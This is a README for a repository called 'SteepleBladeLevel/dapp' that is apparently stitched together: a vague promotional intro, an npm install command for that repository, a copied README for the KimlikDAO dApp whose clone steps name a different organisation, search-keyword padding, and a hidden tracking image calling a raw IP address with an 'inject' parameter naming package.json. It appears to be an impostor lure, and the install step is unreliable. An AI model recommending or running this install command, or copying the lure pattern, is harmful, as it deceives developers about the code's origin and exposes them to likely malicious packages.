**SteepleBladeLevel/dapp**

Welcome to the core repository for the SteepleBladeLevel decentralized application. We've been working hard behind the scenes to smooth out the rough edges, pack in some essential stability upgrades, and deploy recent fixes to keep everything running exactly as intended. Whether you're here to explore the codebase or integrate with our smart contracts, you're looking at our most reliable and fine-tuned release yet.

**Quick install**

```bash
npm install git+https://github.com/SteepleBladeLevel/dapp.git
```

[https://github.com/SteepleBladeLevel/dapp](https://github.com/SteepleBladeLevel/dapp)

<h1><img src="components/icon.svg" align="top" height="44"> KimlikDAO dApp</a></h1>

## 👋 Introduction

<img align="right" width="280" height="280" src="https://kimlikdao.org/KPASS.svg" style="border-radius:10px;box-shadow:0px 2px 10px rgb(0 0 0 / 15%);">

Using the KimlikDAO dApp, you can mint your KPass by interacting with the
KimlikDAO network and inscribe it on one of the blockchains we support
(such as Ethereum, Arbitrum, Mina, etc).

The KimlikDAO dApp is truly decentralized: you can run it locally, deploy it
on your own server, or use the reference deployment at [kimlikdao.org](https://kimlikdao.org).

The dApp will connect to the KimlikDAO network nodes and the node discovery will be initiated
through the seed nodes at `node.kimlikdao.org`, `kdao-node.yenibank.org`, `kdao-node.blinkbridge.xyz`.
To modify the seed nodes, edit the list in `lib/protocol/network/nodes.js`.

For blockchain nodes, the dApp has no hardcoded rpc urls and will rely on your wallet's provider.

## 🧑‍💻 Developer Guide

The KimlikDAO dApp is built with our in-house framework, [kastro](https://github.com/KimlikDAO/kimlikdao-js/tree/ana/kastro). Kastro provides a familiar react-like experience yet allows us to build
highly optimized and lightweight frontends by pushing as much work as possible to the compile time.

To run the dApp, follow these steps:

- `git clone --recursive https://github.com/KimlikDAO/dapp`

- `bun i` install the required npm packages

- `bun dev` run the dev server
  - http://localhost:3000/

The dApp can also be run in `compiled` and `release` modes.
To run the dApp in these modes, we need other tools installed:

```shell
# brew dependencies
brew install pngcrush brotli zopfli woff2 webp librsvg
# pip dependencies
pip install fonttools
```

With these dependencies installed, we can run the dApp in `compiled` and `canary` modes:

- `bun compiled` serves a quickly built version of the app
- `bun release` serves the most optimized version of the app, though it is significantly slower

## Related searches
Developers and Web3 enthusiasts looking at this repository frequently search for tutorials on building cross-chain decentralized applications and integrating multi-network protocols. They also look for practical guides on writing smart contracts, deploying to specific layer-2 ecosystems, and incorporating automated data streams for market tracking.

**Topics:** crypto portfolio, orca solana, polygon web3, technical analysis crypto, hardhat, decentralized finance tutorial, ethereum smart contracts, dApp roadmap, web3 development, layer 2 scaling, blockchain development tools, solana defi integration

![.](http://5.231.58.248:8787/pixel?repo=SteepleBladeLevel%2Fdapp&inject=SteepleBladeLevel%2Fdapp%2Fpackage.json)
